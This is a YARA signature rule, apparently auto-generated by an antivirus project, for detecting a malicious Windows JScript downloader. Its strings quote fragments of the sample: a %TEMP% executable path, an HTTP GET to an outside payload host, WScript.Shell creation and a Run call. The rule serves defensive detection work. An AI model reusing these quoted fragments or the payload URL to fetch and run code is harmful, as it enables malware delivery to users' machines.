rule sig_20160328_485f63b5238bdacf7cd3435fa1e4e392 {
  meta:
    description = "datamaliciousorder - file 20160328_485f63b5238bdacf7cd3435fa1e4e392.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4795dbaf39cd607bdc345955860fc58f1ae3063ccf1ee7ceeaaf16e9f211da6c"

  strings:
    $s1  = "function Bakakgx() {return Hwqnaqw[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"Q9HWQ4b5t.exe\";};" fullword ascii
    $s2  = "Owchdk[Cnovbsyrr](\"GET\", \"http://dukeplasticslab.com/j47akfa\", false);" fullword ascii
    $s3  = "do {WScript[Ihtfmmueg](Lvzhfr() * 11)} while (Owchdk[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Tzmnm(Qovkhrnhs, Qmrfkece){return Qovkhrnhs - Qmrfkece;};" fullword ascii
    $s5  = "var Hwqnaqw = function Tciesi() {return WScript[Ahulwvk](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Rviigpje() {return ((Pdbzwkp == true) && (Pdbzwkp == Fxqrttimnt)) ? 1 : Vzdnocq;};" fullword ascii
    $s7  = "function Wiufj(Kwhnhryelq){Hwqnaqw[\"Run\"](Kwhnhryelq, Vzdnocq, Vzdnocq);};" fullword ascii
    $s8  = "Pdbzwkp = true; " fullword ascii
    $s9  = "var Jzjgqpflil = false;" fullword ascii
    $s10 = "var Obrmxygm = new this[\"Date\"]();" fullword ascii
    $s11 = "function Lvzhfr(){return 22;};" fullword ascii
    $s12 = "function Dfwvoywoi(){return Ahulwvk;};" fullword ascii
    $s13 = "var Pdbzwkp = false;" fullword ascii
    $s14 = "function Udyhfbl(){return Ijtjv;};" fullword ascii
    $s15 = "return Tzmnm(Rqehz, Zkvjjjpnt);" fullword ascii
    $s16 = "function Ubiexqw()" fullword ascii
    $s17 = "Fxqrttimnt = true; " fullword ascii
    $s18 = "function Uzobpssei(Wrafioz) {var Ekfyo = (1, 2, 3, 4, 5, Wrafioz); return Ekfyo;};" fullword ascii
    $s19 = "var Fxqrttimnt = false;" fullword ascii
    $s20 = " while (Fzlpyzcdj){" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}